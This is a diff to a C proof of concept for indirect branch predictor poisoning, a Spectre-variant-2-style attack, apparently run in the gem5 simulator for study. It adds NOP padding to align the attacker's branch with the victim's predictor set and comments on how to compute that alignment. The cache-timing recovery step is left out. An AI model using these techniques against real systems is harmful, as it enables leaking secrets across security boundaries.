@@ -1,7 +1,39 @@
 #include "victim.h"
+#include "repeat.h"
+#include <unistd.h>
 
 /* Gives this program access to ebx */
 register void *ebx __asm("rbx");
+
+/* How many iterations to run the branch poisoning */
+const int poison_iterations = 10;
+
+/* Some schenanigans to get the indirect branch aligned the way we want */
+void alignment_dummy(void) __attribute__ ((aligned(256)));
+void alignment_dummy(void) {
+    /* The GCC attribute ensures that the start of this function is
+     * aligned on a 256-byte boundary */
+    /* Repeat this one-byte NOP the number of times needed to align
+     * the two indirect branches.
+     *
+     * First, find the address of the target branch and its set number
+     * (addr >> 2 & 0xFF). For me, this is a callq *%rax at 0x40118f,
+     * set 99.
+     *
+     * Second, compile with the macro below as REPEAT_0 and find the
+     * set of the attack indirect branch. For me, 0x40122f, set 139
+     *
+     * Third, compute (target set - attack set) % 256. Set the macro
+     * to repeat that many times.
+     *
+     */
+    REPEAT_216( \
+    __asm("xchg %rax, %rax"); \
+    __asm("xchg %rax, %rax"); \
+    __asm("xchg %rax, %rax"); \
+    __asm("xchg %rax, %rax"); \
+    );
+}
 
 /* Poison the indirect branch predictor so that  */
 void poison_branch(void) {
@@ -26,7 +58,7 @@ void poison_branch(void) {
 
 int main(void) {
     /* Poison the target branch */
-    for (int i = 0; i < 1000; i++) {
+    for (int i = 0; i < poison_iterations; i++) {
         poison_branch();
     }
 
@@ -37,7 +69,7 @@ int main(void) {
     victim_entry(&example_cmp);
 
     /* This is where we'd perform a cache timing attack to recover the
-     * the secret, but we're using gem5 for that */
+     * the secret, but we're using gem5 to snoop the cache explicitly */
 
     return 0;
 }
